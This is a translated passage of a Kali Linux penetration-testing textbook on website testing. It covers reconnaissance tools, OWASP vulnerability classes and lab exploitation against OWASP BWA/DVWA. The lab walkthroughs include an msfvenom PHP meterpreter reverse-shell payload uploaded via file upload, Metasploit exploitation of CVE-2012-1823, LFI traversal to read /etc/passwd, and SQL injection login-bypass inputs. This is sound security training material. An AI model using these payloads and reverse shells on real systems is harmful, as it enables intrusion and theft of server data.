# Kali Linux 2019 学习手册（四）

> 原文：[`annas-archive.org/md5/29591BFA2DAF3F905BBECC2F6DAD8828`](https://annas-archive.org/md5/29591BFA2DAF3F905BBECC2F6DAD8828)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第十四章：执行网站渗透测试

这一章使我们远离我们习惯于利用的常规网络设备，而是专注于检查 Web 应用程序和服务器中的漏洞。

作为渗透测试人员是一份相当酷的工作，因为你被付钱来侵入或攻破别人的网络和系统，但是合法的。

作为渗透测试人员还意味着开发和扩展你的技能范围到各种领域；总会有情况需要你对客户的 Web 服务器进行漏洞评估或渗透测试。本章将首先教你如何发现目标网站上正在使用的基础技术，以及如何发现同一服务器上托管的其他网站。此外，你还将学习如何在目标 Web 服务器上执行多个利用，包括上传和执行恶意文件以及利用**本地文件包含**（**LFI**）对一个有漏洞的服务器进行利用。

在本章中，我们将涵盖以下主题：

+   信息收集

+   密码学

+   文件上传和文件包含漏洞

+   利用文件上传漏洞

+   利用代码执行漏洞

+   利用 LFI 漏洞

+   防止漏洞

让我们开始吧！

# 技术要求

本章的技术要求如下：

+   **Kali Linux**: [`www.kali.org/`](https://www.kali.org/)

+   **OWASP 破碎的 Web 应用项目**：[`sourceforge.net/projects/owaspbwa/`](https://sourceforge.net/projects/owaspbwa/)

# 信息收集

在本书的早期部分，特别是第五章中的*被动信息收集*和第六章中的*主动信息收集*，我们讨论了对目标进行广泛侦察的重要性，无论是单个系统、网络，甚至是网站。每次渗透测试都有一套指南和阶段。正如你可能记得的那样，渗透测试的阶段包括：

1.  侦察（信息收集）

1.  扫描（和枚举）

1.  利用（获取访问权限）

1.  保持访问

1.  覆盖踪迹

尽可能收集有关目标的信息有助于我们确定目标是否存在安全漏洞以及是否可能利用它们。在接下来的部分中，我们将首先学习如何发现网站上正在使用的技术。

# 发现网站上正在使用的技术

在网站渗透测试的信息收集阶段，确定实际网页服务器上运行的基础技术是很重要的。**Netcraft** ([www.netcraft.com](http://www.netcraft.com))是一个互联网安全和数据挖掘网站，可以帮助我们发现任何给定网站上的网页技术。

要开始使用**Netcraft**，请按照以下步骤进行：

1.  前往[`toolbar.netcraft.com/site_report`](https://toolbar.netcraft.com/site_report)。

1.  在网站上，输入查找字段中的网站 URL。

以下是为[www.google.com](http://www.google.com)网站检索到的结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/5d50c471-7237-434d-9eba-00f8a4754bd8.png)

Netcraft 能够提供有关目标网站的许多详细信息，包括以下内容：

+   +   域名

+   公共 IP 地址

+   域名注册商

+   组织

+   Netblock 所有者

+   域名服务器

+   DNS 管理员联系

+   Web 服务器类型

+   Web 服务器操作系统

已经获取了 Web 服务器操作系统和正在运行的应用程序，现在可以将范围缩小到搜索适合目标的漏洞和利用。

1.  此外，您可以使用**Netcat**实用程序执行**横幅抓取**。此技术用于检索目标设备上正在运行的守护程序或应用程序的服务版本。使用以下命令，我们可以在端口`80`上在我们的机器（Kali Linux）和目标 Web 服务器之间建立连接：

```
nc www.google.com 80
```

1.  接下来，是时候检索 Web 服务器横幅了。执行以下命令：

```
GET / HTTP/1.1
```

1.  按两次*Enter*，Web 服务器横幅将显示在顶部。以下是显示[www.google.com](http://www.google.com)地址的服务器横幅的片段，以及其 Web 服务器类型：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/cd337673-9af3-4013-8690-0d38e5f69e5a.png)

请记住，使用 Netcat 实用程序将在攻击者机器（Kali Linux）和目标之间建立会话。如果目标是隐蔽的（不可检测），则不建议使用此方法，除非您正在欺骗您的 IP 地址和 MAC 地址。

可以选择使用**Telnet**执行此技术。只需用`telnet`替换`nc`，您应该在终端窗口上获得相同的结果。

在接下来的部分，我们将深入探讨托管在同一 Web 服务器上的网站的发现。

# 发现托管在同一服务器上的网站

多年来，组织已经摆脱了在自己的本地服务器上托管公司网站的做法，转而使用在线的基于云的解决方案。在电子商务行业有许多网站托管公司提供网站托管等解决方案。

托管提供商通常不会为客户提供专用服务器来托管他们的网站；相反，他们会提供共享空间。换句话说，托管您网站的服务器也会托管其他人的网站。这对服务提供商和客户都是有利的。客户支付较少的费用，因为他们只是与其他人共享服务器上的资源，服务器提供商不需要为每个用户启动专用服务器，这将导致更少的功耗和数据中心中的物理存储空间。

由于服务提供商使用这种为客户提供共享空间的业务和 IT 方法，安全性是一个问题。这就像在学校实验室使用计算机一样；每个人都有自己的用户帐户，但仍在共享一个系统。如果一个用户决定在计算机上执行恶意操作，他们可能能够从其他用户的帐户/配置文件中检索敏感数据。

在第五章，*被动信息收集*中，引入了**Maltego**，以便我们可以对目标网站执行被动信息收集。在本节中，我们将再次使用 Maltego 来帮助我们发现托管在同一服务器上的网站。

在继续之前，请确保您熟悉使用**Maltego**执行各种信息收集任务。如果您在记住如何使用 Maltego 中的基本工具方面有困难，请花几分钟时间查看第五章，*被动信息收集*。

观察以下步骤以发现同一服务器上的网站：

1.  在 Maltego 上添加一个域。在这个练习中，我使用免费的网络托管提供商创建了一个新的域。您可以做同样的事情，或者如果您已经拥有一个现有的域名，也可以使用您现有的域名。

在未经他们的知识和同意的情况下，您不应该使用其他人的域。在这个练习中，我只创建并拥有目标域。

1.  右键单击域实体，选择所有变换|到 DNS 名称-NS（名称服务器），如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/eddd7c9c-74db-4259-b2d7-396346f05603.png)

Maltego 将花费几秒钟来检索目标域名的名称服务器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/f86224c5-3cb0-4f7b-b0d0-e510fdf34297.png)

我的自定义域的托管提供商正在使用两个名称服务器。

1.  一旦获取了域名服务器，就该检查是否有其他网站托管在同一台服务器上。右键单击一个域名服务器，然后选择所有转换 | 到域（共享此 NS），如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/b512b482-3de0-412f-b2e1-e47cbdf3a345.png)

这个过程通常需要一两分钟才能完成。完成后，Maltego 将为您提供结果。如您在下面的片段中所见，有多个网站托管在与我的域相同的服务器上：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/e6ef5cde-d24a-4a68-8da7-184db08ed8d4.png)

这种技术在对目标组织的 Web 服务器进行概要分析时非常有用。有时，您可能会遇到一个组织将他们的网站和其他内部网站托管在网络的 DMZ 部分的同一台服务器上。始终尝试执行枚举技术以提取 Web 服务器上的任何站点。有时，组织将其内部网站托管在与其公共网站相同的 Web 服务器上。访问隐藏站点可以提供有益的信息。

免责声明：为了保护机密性，与网站相关的信息已经模糊处理，因为它属于其他方。

在下一节中，我们将学习如何在网站上发现敏感文件的方法。

# 发现敏感文件

为了继续我们的网站渗透测试中的信息收集阶段，我们将尝试发现目标网站上的任何敏感文件和目录。为了执行这项任务，我们将使用 DirBuster。DirBuster 是一个用于暴力破解 Web 应用程序的工具，旨在揭示目标 Web 服务器上的任何敏感目录和文件。

在这个练习中，我们将使用 OWASP Broken Web Applications（BWA）项目虚拟机作为目标，使用我们的 Kali Linux 机器作为攻击者。

要在 Web 服务器上发现敏感文件，请按照以下步骤操作：

1.  通过导航到应用程序 | 03 - Web 应用程序分析 | Web 爬虫和目录暴力破解 | DirBuster 打开 DirBuster。

1.  当 DirBuster 打开时，在目标 URL 字段中输入 OWASP BWA 虚拟机的 IP 地址。URL 应该是`http://192.168.56.101:80/`的格式。

1.  您还可以选择增加线程的数量。增加线程的数量将为应用程序应用更多的计算能力，因此会加快进程速度。

1.  单击“浏览”以添加 DirBuster 将用于在目标网站上索引和搜索的单词列表。如果单击“列表信息”，将会出现一个新窗口，提供一个推荐的单词列表。

1.  取消选中“递归”旁边的框。

1.  点击“开始”开始这个过程。

以下屏幕截图显示了此任务所使用的选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/3382b38e-b1b3-46d3-91ba-828096cfe05c.png)

此外，您还可以使用来自其他位置的单词列表，例如 SecLists。

文件扩展名选项可以自定义，并且是查找具有`.bak`和`.cfg`等文件的隐藏目录的好方法。

在 DirBuster 执行暴力攻击时，结果窗口将出现。要查看所有当前目录和文件，请单击结果 - 列表视图选项卡，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/f6c26aff-96a2-4b4a-a542-8b693f27d779.png)

HTTP 200 状态代码表示操作成功。换句话说，攻击者机器已成功能够与目标网站/服务器上的特定目录进行通信。

此外，还可以使用 Burp Suite 和 OWASP ZAP 等其他工具来发现目标 Web 服务器和网站上的隐藏目录和敏感文件。

如前面的片段所示，使用 DirBuster 找到了目录列表。浏览每个目录，因为它们可能包含有关目标的敏感文件和信息。

在下一节中，我们将看一下`robots.txt`文件的重要性。

# robots.txt

`robots.txt`文件包含来自 Web 服务器的目录和文件列表。`robots.txt`文件中的条目由网站所有者或 Web 管理员创建，并用于隐藏 Web 爬虫的目录位置。换句话说，它通知搜索引擎的爬虫不要索引网站的某个目录。

渗透测试人员在域名末尾添加`robots.txt`扩展名，以访问和查看其内容。以下是知名组织的`robots.txt`文件的条目：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/f1057553-76e4-4574-b30b-4702767eb4c2.png)

如您所见，有多个目录。通过简单地将每个目录与域名结合，您将能够访问目标网站上的隐藏区域。让我们使用`/administrator/`目录：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/5bfcabc5-8062-4c30-b176-5af022b7aa17.png)

我们现在可以访问站点控制面板的登录页面。使用其他目录可能会提供其他有益的信息。

在下一部分，我们将深入分析目标服务器上发现的文件。

# 分析发现的文件

隐藏目录通常包含具有重要信息的敏感文件。

观察以下步骤，开始分析发现的文件：

1.  在 DirBuster 结果窗口中，单击“结果-树视图”选项卡。这将为您提供一个树形结构，允许您展开每个文件夹：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/47b5743a-fdcf-46e1-971a-be82f4fd5c68.png)

通过展开`cgi-bin`文件夹，我们可以看到两个文件，如前面的截图所示。使用 Web 浏览器，我们可以添加目录扩展名和服务器的 IP 地址，以创建 URL。

1.  输入`http://192.168.56.101/cgi-bin/`地址，网页浏览器显示了文件、最后修改日期、文件大小和描述：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/b96b07f6-ccaa-44c0-8b69-fcdf50c4ab9f.png)

1.  此外，我们可以使用`dirb`来检查目标 Web 服务器上的文件和目录。如果我们使用以下语法，`dirb`允许我们执行快速扫描：

```
dirb http://192.168.56.101
```

1.  作为命令的一部分，您可以选择使用自定义字典：

```
dirb http://192.168.56.101 <wordlist>
```

以下截图是 DirBuster 执行的快速扫描。如果您仔细观察，您会注意到 DirBuster 能够发现隐藏的目录和文件，以及它们的大小：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/2c8bc6e2-8eb1-41ae-a1d8-81c3ce4bbfae.png)

执行这样的任务可能会耗费一些时间，可能需要几分钟，甚至几个小时才能完成。

在接下来的部分，我们将深入学习密码学知识。

# 密码学

密码学是一种保护系统上的数据免受未经授权的人员访问的技术。这种技术涉及将消息通过加密密码（算法），并提供一个称为密文的输出（加密消息）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/961356db-49f2-4efe-9697-2a691d494293.png)

密码学有以下目标：

+   机密性

+   完整性

+   认证

+   不可否认性

然而，Web 应用程序可以在其应用程序中使用设计不良的加密代码，以保护最终用户浏览器和 Web 应用程序之间以及 Web 应用程序和数据库服务器之间传输的数据。

这样的安全漏洞可能导致攻击者窃取和/或修改 Web 或数据库服务器上的敏感数据。

接下来，我们将学习有关各种 Web 漏洞以及如何在目标 Web 服务器上利用文件上传和文件包含漏洞。

# 文件上传和文件包含漏洞

在本节中，我们将讨论各种安全漏洞，允许攻击者在 Web 服务器上执行文件上传、代码执行和文件包含攻击。

在接下来的部分，我们将介绍以下主题的基础知识：

+   **跨站脚本**（**XSS**）

+   **跨站请求伪造**（**CSRF**）

+   **结构化查询语言注入**（**SQLi**）

+   不安全的反序列化

+   常见的配置错误

+   易受攻击的组件

+   不安全的直接对象引用

让我们开始吧！

# XSS

XSS 攻击是通过利用动态创建的网页中的漏洞来进行的。这允许攻击者将客户端脚本注入到其他用户正在查看的网页中。当一个毫无戒心的用户访问包含 XSS 的网页时，用户的浏览器将在受害者不知情的情况下开始在后台执行恶意脚本：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/52f9095b-8507-47b0-b46b-b2eea97139ab.png)

XSS 攻击通常专注于将用户重定向到恶意 URL，数据窃取，操纵，显示隐藏的 IFRAMES，并在受害者的 Web 浏览器上显示弹出窗口。

恶意脚本包括 ActiveX、VBScript、JavaScript 或 Flash。

XSS 攻击有两种类型：

+   存储型 XSS

+   反射型 XSS

在接下来的部分，我们将详细讨论这两种攻击。

# 存储型 XSS

存储型 XSS 在网页上是**持久**的。攻击者将恶意代码注入到服务器上的 Web 应用程序中。代码/脚本被永久存储在页面上。当潜在受害者访问受损的网页时，受害者的浏览器将解析所有的 Web 代码。然而，在后台，恶意脚本正在受害者的 Web 浏览器上执行。这使得攻击者能够检索存储在受害者的 Web 浏览器上的任何密码、cookie 信息和其他敏感信息。

# 反射型 XSS

反射型 XSS 是一种**非持久**攻击。在这种形式的 XSS 中，攻击者通常向潜在受害者发送一个恶意链接。如果受害者点击恶意链接，它将在受害者的计算机上打开默认的 Web 浏览器（反射）。Web 浏览器将自动加载包含恶意脚本的网页，恶意脚本将自动执行，捕获密码，cookie 信息和其他敏感信息。

接下来，我们将深入探讨 CSRF。

# CSRF

CSRF 攻击与 XSS 攻击有些相似。让我们用类比来简化对 CSRF 攻击的解释。想象一下，用户 Bob 打开他的 Web 浏览器并登录到他的银行客户门户，以在他的账户上进行一些在线交易。Bob 已经在他的银行的 Web 门户上使用了他的用户凭据；Web 应用程序/服务器验证用户是 Bob，并自动信任他的计算机作为与 Web 服务器通信的设备。

然而，Bob 还在同一个浏览器中打开一个新标签页访问另一个网站，同时保持与银行的 Web 门户（受信任的站点）的活动会话。Bob 并不怀疑他访问的新网站包含恶意代码，然后在 Bob 的计算机上后台执行：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/d3a41ba0-af2a-4722-ba36-22e3a69a4419.png)

然后，恶意代码将从 Bob 的计算机向受信任的站点注入 HTTP 请求。通过这种方式，攻击者能够捕获 Bob 的用户凭据和会话信息。此外，恶意链接还可以导致 Bob 的计算机在受信任的站点上执行恶意操作。

在下一节中，我们将详细介绍**SQL 注入**（SQLi）攻击的基本知识。

# SQLi

SQLi 允许攻击者将一系列恶意的 SQL 代码/查询直接插入到后端数据库服务器中。这使得攻击者能够操纵记录，如添加、删除、修改和检索数据库中的条目：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/95000a39-1ab0-4499-a8ee-3bc869b243fa.png)

攻击者可以利用 Web 应用程序的漏洞来绕过安全控制和措施，以进入数据库服务器/应用程序。SQLi 攻击是通过 Web 浏览器的地址栏或网站的登录门户注入的。

接下来，我们将讨论不安全的反序列化。

# 不安全的反序列化

**序列化**是将对象转换为较小字节大小的过程，以便传输或存储对象在文件、数据库甚至内存中。这个过程允许对象保持其状态，以便在需要时进行组装/重建。然而，序列化的反义词称为**反序列化**。这是将数据流（字节）重新创建为其原始形式的过程。

**不安全的反序列化**发生在不受信任的数据被用来滥用应用程序逻辑、创建拒绝服务攻击或在网页应用程序/服务器上执行恶意代码的情况下。在不安全的反序列化攻击中，攻击者可以在目标网页服务器上执行远程代码。

有关不安全的反序列化的更多信息可以在 OWASP 网站上找到，网址为[`www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization`](https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization)。

大多数情况下，系统管理员和 IT 专业人员直到网络攻击来临时才会认真对待这些漏洞。作为渗透测试人员，我们的工作是高效地发现目标组织中所有现有和隐藏的安全漏洞，并通知公司以帮助保护他们的资产。

在接下来的部分，我们将概述一些网页服务器上常见的配置错误。

# 常见的配置错误

网页服务器上的配置错误可能会导致漏洞，允许攻击者未经授权访问默认用户帐户、访问隐藏页面和目录、对任何未修补的缺陷进行利用，以及在服务器上对不安全目录和文件执行读/写操作。

安全配置错误不仅限于网页应用程序的任何级别，还可能影响网页服务器和应用程序的任何级别，如操作系统（Windows 或 Linux）、网页服务器平台（Apache、IIS 和 Nginx）、框架（Django、Angular、Drupal 等）甚至托管在服务器上的自定义代码。

在接下来的部分，我们将讨论在网页服务器和平台上发现的各种易受攻击的组件。

# 易受攻击的组件

以下是网页应用程序中一些常见的易受攻击的组件：

+   **Adobe Flash Player**：Adobe Flash Player 通常用作网页浏览器中的多媒体播放器。它支持在线视频、音频和游戏等应用内容。然而，多年来，已经发现并记录了许多安全漏洞，用户已经开始放弃在其网页浏览器上使用这个组件。最近的一个漏洞是**CVE-2018-15982**，它允许成功利用导致目标系统上的任意代码执行。

+   **JBoss 应用服务器**：JBoss 应用服务器是一个 Java 网页容器，既是开源的，也能够跨平台操作。在撰写本书时，发现了一个严重漏洞，使攻击者能够在 JBoss 应用服务器上远程执行恶意代码，从而完全控制目标。

该漏洞影响了所有 JBoss 应用服务器版本 4.0 及之前的版本。

+   **Adobe ColdFusion**：Adobe ColdFusion 是一个商业网页应用开发平台。其设计旨在允许开发人员轻松地将 HTML 页面连接到数据库。然而，在 2018 年，发现了一个关键漏洞，允许攻击者在没有任何限制的情况下将数据上传到受损系统，进而允许攻击者使用 Web shell 控制服务器。这个漏洞被记录为**CVE-2018-15961**。

请注意，这些只是网页服务器上可以找到的许多易受攻击的组件之一。随着时间的推移，安全研究人员将继续发现和记录新的漏洞。

在接下来的部分，我们将简要讨论**不安全的直接对象引用**（**IDOR**）。

# IDOR

根据 OWASP（[www.owasp.org](http://www.owasp.org)）的说法，IDOR 发生在基于用户提供的输入提供对对象的访问权限时。如果发现 Web 应用程序存在漏洞，攻击者可以尝试绕过授权并访问受损系统上的资源。

接下来，我们将演示如何利用目标机器上的文件上传漏洞。

# 利用文件上传漏洞

在这个练习中，我们将使用我们的 OWASP BWA 虚拟机来演示文件上传漏洞。让我们开始吧：

1.  首先，在 Kali Linux（攻击者）机器上使用`msfvenom`创建有效载荷，稍后将上传到目标服务器。使用以下语法，创建一个基于 PHP 的有效载荷以建立反向连接：

```
msfvenom -p php/meterpreter/reverse_tcp lhost=<IP address of Kali Linux> lport=4444 -f raw
```

1.  复制突出显示的代码，打开文本编辑器，并将文件保存为`img.php`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/3515f8e8-4851-440d-8653-46e9b222a624.png)

1.  在 Kali Linux 中的 Web 浏览器中，输入 OWASP BWA 的 IP 地址并点击*Enter*。

1.  在主页上，单击**Damn Vulnerable Web Application**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/4c9eb84f-eccd-4a1c-bc70-04ce74a48e2c.png)

1.  DVWA 登录门户将出现。使用`admin`/`admin`作为用户名/密码登录：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/a72d97a5-d315-4397-b695-4515e21e5566.png)

1.  登录后，您将在左侧看到一个菜单。单击上传以查看漏洞：文件上传页面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/82c7950a-c57e-4d9d-bdd4-29873165967f.png)

1.  单击浏览...，选择`img.php`文件，然后单击页面上的上传。

1.  一旦文件被上传，您将收到一条消息，显示文件在服务器上的存储目录：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/185e6808-af63-4746-a6bf-853ed461c7ee.png)

1.  复制文件位置，即`hackable/uploads/img.php`，并将其粘贴到 URL 中以执行有效载荷（`img.php`）。以下是预期的 URL：

```
192.168.56.101/DVWA/ hackable/uploads/img.php
```

按*Enter*执行有效载荷。

1.  在 Kali Linux 上，使用以下命令加载 Metasploit：

```
service postgresql start msfconsole
```

1.  在 Metasploit 中启用`multi/handler`模块，设置反向 TCP 有效载荷，并使用以下命令执行利用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/2bb249a6-8aa5-434d-8229-a5734cd83289.png)

请确保检查 Kali Linux 机器的 IP 地址，并相应地调整`LHOST`参数。

1.  在服务器上执行了`img.php`有效载荷并在 Metasploit 上启用了`multi/handler`后，我们能够在攻击者机器上接收到一个反向 shell，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/ed29642c-7be8-44cb-b0ab-08887b8d84f5.png)

使用`meterpreter` shell，您现在可以在受损系统上执行进一步的操作。

在接下来的部分，我们将演示如何利用代码执行漏洞。

# 利用代码执行漏洞

当设备容易受到代码执行攻击时，攻击者或渗透测试人员被允许在目标服务器上远程执行代码。此外，渗透测试人员将能够检索存储在目标上的源代码。

为了完成这个练习，我们将使用以下拓扑结构：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/739a76ec-d61e-429a-82ac-79a80fadd0aa.png)

要开始执行代码执行利用，请按照以下步骤进行：

1.  我们将尝试发现目标是否容易受到**CVE-2012-1823**的攻击。要发现目标是否容易受到攻击，请使用以下命令与`nmap`：

```
nmap -p80 --script http-vuln-cve2012-1823 <target IP address> 
```

Nmap 可能并不总是返回结果，表明目标存在漏洞。然而，这不应该阻止您确定目标是否容易受到攻击。

1.  接下来，在**Metasploit**中，使用`search`命令查找一个适合的利用模块，以帮助我们利用目标上的漏洞：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/89a269bf-78d5-495a-93e8-7db7dd151d1e.png)

1.  接下来，使用以下命令使用模块并设置远程目标：

```
use exploit/multi/http/php_cgi_arg_injection set RHOSTS 10.10.10.11
```

1.  此外，以下命令允许您使用适当的有效载荷在利用后建立远程 shell 并设置您的本地主机 IP 地址：

```
set payload php/meterpreter/reverse_tcp set LHOST 10.10.10.10
```

1.  使用`exploit`命令对目标发动攻击。以下截图显示了攻击成功的目标：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/f85fcc3c-3a78-4c56-892d-c4d03baa8725.png)

有效载荷已发送到受害者，并且我们有了一个反向 shell。完成了本节后，您现在可以发现并在目标服务器上执行代码执行。

在下一节中，我们将演示如何利用 LFI 漏洞。

# 利用 LFI 漏洞

易受 LFI 安全漏洞影响的服务器允许攻击者通过 Web 浏览器中的 URL 显示文件的内容。在 LFI 攻击中，渗透测试人员可以使用`../`或`/`从其目录中读取任何文件的内容。

要开始，请返回到**OWASP BWA**中的**Damn Vulnerable Web Application**（**DVWA**）Web 界面：

1.  在 DVWA Web 界面上，点击左侧菜单上的文件包含：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/bb320a7c-f6bc-432c-abc0-73faaa6b52fe.png)

1.  通过重复使用`../`几次并插入`passwd`文件的目录，我们能够查看目标 Web 服务器上`passwd`文件的内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/f9a7801d-8af2-4268-95ad-35a88a63fbb5.png)

这种类型的攻击测试系统的目录遍历漏洞。目录遍历允许攻击者访问受限制的位置和文件，并在目标 Web 服务器上执行命令。这个攻击者可以通过在 URL 中简单地使用`点-点-斜杠（../）`语法来操纵变量。

到目前为止，我们已经完成了一些练习，以利用目标系统的各种弱点。在下一节中，我们将看看如何预防和减轻安全漏洞。

# 预防漏洞

以下是可以用来防止 Web 服务器和 Web 应用程序攻击并纠正此类漏洞的对策：

+   对操作系统和 Web 应用程序应用最新（稳定）的补丁和更新。

+   在 Web 服务器上禁用任何不必要的服务和协议。

+   尽可能使用安全协议，例如支持数据加密。

+   如果使用不安全的协议，实施安全控件以确保它们不被利用。

+   如果 Web 应用程序没有使用 WebDAV，则禁用 WebDAV。

+   删除所有未使用的模块和应用程序。

+   禁用所有未使用的默认帐户。

+   更改默认密码。

+   实施安全策略以防止暴力破解攻击，例如对于登录尝试失败的警戒策略。

+   禁用目录列表的服务。

+   监视和检查日志以发现任何可疑活动。

+   从受信任的**证书颁发机构**（**CA**）实施数字证书，并确保数字证书始终是最新的。

+   确保数据输入验证和净化已实施并定期测试。

+   实施**Web 应用程序防火墙**（**WAF**）。

这些项目只是 IT 专业人员可以采用的预防措施的摘要；然而，由于每天都会出现新的更复杂的威胁和攻击，因此需要进行额外的研究。

# 总结

在本章的课程中，我们已经讨论了我们可以使用的技术，以确定 Web 服务器上的 Web 技术，并对目标 Web 应用程序执行真实世界的模拟攻击。

现在，您可以发现目标 Web 服务器上使用的基础 Web 技术，并进行进一步的枚举，以发现单个 Web 服务器上托管的其他网站。此外，通过完成本章的练习，您具备了发现目标服务器上任何敏感文件和目录的技能，并进行网站渗透测试以利用文件上传和 LFI 漏洞。

希望本章对您的学习和职业有所帮助和启发。在下一章，第十五章，*网站渗透测试-获取访问权限*，您将学习如何使用高级 Web 应用程序渗透测试。

# 问题

1.  有哪些 Web 服务器平台？

1.  可以用什么工具来发现 Web 服务器上的隐藏文件？

1.  什么 HTTP 状态代码表示成功？

1.  哪种类型的攻击允许攻击者从受害者的 Web 浏览器中检索存储的数据？

1.  哪种类型的攻击允许恶意用户操纵数据库？

# 进一步阅读

以下是一些额外的阅读资源：

+   **易受攻击的组件**：[`resources.infosecinstitute.com/exploring-commonly-used-yet-vulnerable-components/`](https://resources.infosecinstitute.com/exploring-commonly-used-yet-vulnerable-components/)

+   **测试不安全的直接对象引用**：[`www.owasp.org/index.php/Testing_for_Insecure_Direct_Object_References_(OTG-AUTHZ-004)`](https://www.owasp.org/index.php/Testing_for_Insecure_Direct_Object_References_(OTG-AUTHZ-004))

+   **Web 服务器配置错误**：[`www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration`](https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration)


# 第十五章：网站渗透测试 - 获取访问权限

在本章中，我们将比迄今为止更深入地探讨网站和数据库渗透测试。作为渗透测试人员，我们需要根据规则进行模拟对目标组织系统和网络的真实攻击。然而，虽然能够进行信息收集，如侦察和扫描网站，是很好的，但真正的挑战在于何时突破。准备好渗透入敌人基地是很好的，但如果你只是站在远处什么也不做，那一切准备都将毫无意义！

在本章中，我们将探讨如何妥协和获取对 Web 服务器和 Web 应用程序的访问权限。此外，您还将学习一些实际的技术和方法来发现漏洞并检索数据。

在本章中，我们将涵盖以下主题：

+   探索 SQL 注入的危险

+   SQL 注入漏洞和利用

+   跨站脚本漏洞

+   自动发现漏洞

# 技术要求

以下是本章的技术要求：

+   Kali Linux: [`www.kali.org/`](https://www.kali.org/)

+   Windows 7、8 或 10

+   OWASP **Broken Web Applications** (**BWA**) 项目：[`sourceforge.net/projects/owaspbwa/`](https://sourceforge.net/projects/owaspbwa/)

+   Acunetix: [`www.acunetix.com/`](https://www.acunetix.com/)

+   bWAPP: [`sourceforge.net/projects/bwapp/`](https://sourceforge.net/projects/bwapp/)

# 探索 SQL 注入的危险

如前一章所述（第十四章，*进行网站渗透测试*），**SQL 注入**（**SQLi**）允许攻击者将一系列恶意的 SQL 代码/查询直接插入后端数据库服务器。这种漏洞允许攻击者通过向数据库中添加、删除、修改和检索条目来操纵记录。

在本节中，我们将涵盖以下主题：

+   来自 SQL 注入漏洞的危险

+   利用 SQL 注入漏洞绕过登录

现在，让我们详细了解 SQL 注入的危险。

# 来自 SQL 注入漏洞的危险

成功的 SQL 注入攻击可能会导致以下情况：

+   **身份验证绕过**：允许用户在没有有效凭据或权限的情况下访问系统

+   **信息泄露**：允许用户获取敏感信息

+   **数据完整性受损**：允许用户操纵数据库中的数据

+   **数据可用性受损**：阻止合法用户访问系统上的数据

+   **在受损系统上远程执行代码**：允许恶意用户远程在系统上运行恶意代码

接下来，让我们看看如何利用 SQL 注入绕过登录。

# 利用 SQL 注入绕过登录

在这个练习中，我们将使用 OWASP BWA 虚拟机来演示如何利用 SQL 注入绕过身份验证。首先，启动 OWASP BWA 虚拟机。几分钟后，虚拟机将提供其 IP 地址。

前往您的 Kali Linux（攻击者）机器，并按照以下步骤操作：

1.  在 Kali Linux 的 Web 浏览器中输入 OWASP BWA 虚拟机的 IP 地址。

1.  点击**OWASP Mutillidae II**应用程序，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/f1717a7a-4a87-4e02-be65-02f316d8184e.png)

1.  导航到以下页面：OWASP 2013 | A2 - Broken Authentication and Session Management | Authentication Bypass | Via SQL Injection | Login:

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/b115b27e-7329-4a6d-815a-f394dfec0cfd.png)

1.  在**用户名**字段中输入以下任意一个字符：

+   `**'**`

+   `**/**`

+   `**--**`

+   `**\**`

+   `**.**`

如果登录页面出现错误，请检查服务器生成的消息。

如果网站的登录页面没有出现错误，请尝试使用 true 或 false 语句，如`1=1 --`或**`1=0 --`**。

当我们运行此命令时，类似以下错误应该出现。如果您仔细观察，可以看到在 Web 服务器应用程序和数据库之间使用的查询，`SELECT username FROM accounts WHERE username= ' ' ' ;`，如下所示：

